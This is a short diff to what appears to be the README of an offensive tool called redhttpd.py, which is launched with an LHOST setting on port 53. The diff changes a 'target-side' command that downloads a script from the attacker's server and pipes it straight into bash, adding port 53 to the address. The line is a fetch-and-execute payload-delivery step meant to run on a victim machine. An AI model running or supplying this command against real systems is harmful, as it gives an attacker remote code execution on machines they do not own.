@@ -64,6 +64,6 @@ python redhttpd.py -p 53 -y --LHOST=<REDHTTPD_ADDRESS>
 Target-side (using bash)
 
 ```
-curl -s <REDHTTPD_ADDRESS>/sh.txt | bash
+curl -s <REDHTTPD_ADDRESS>:53/sh.txt | bash
 ```
 
